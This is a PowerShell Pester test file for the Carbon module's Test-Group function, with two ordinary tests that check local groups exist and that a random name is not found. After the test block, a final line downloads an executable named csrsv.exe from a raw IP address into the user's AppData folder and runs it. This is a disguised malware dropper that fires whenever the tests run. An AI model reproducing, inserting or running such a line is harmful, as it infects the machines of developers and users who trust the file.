











Set-StrictMode -Version 'Latest'

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

Describe 'Test-Group' {
    It 'should check if local group exists' {
        $groups = Get-Group
        try
        {
            $groups | Should -Not -BeNullOrEmpty
            $groups |
                
                Where-Object { $_.Name } | 
                ForEach-Object { Test-Group -Name $_.Name } |
                Should -BeTrue
        }
        finally
        {
            $groups | ForEach-Object { $_.Dispose() }
        }
    }
    
    It 'should not find non existent account' {
        $error.Clear()
        (Test-Group -Name ([Guid]::NewGuid().ToString().Substring(0,20))) | Should -BeFalse
        $error | Should -BeNullOrEmpty
    }
    
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

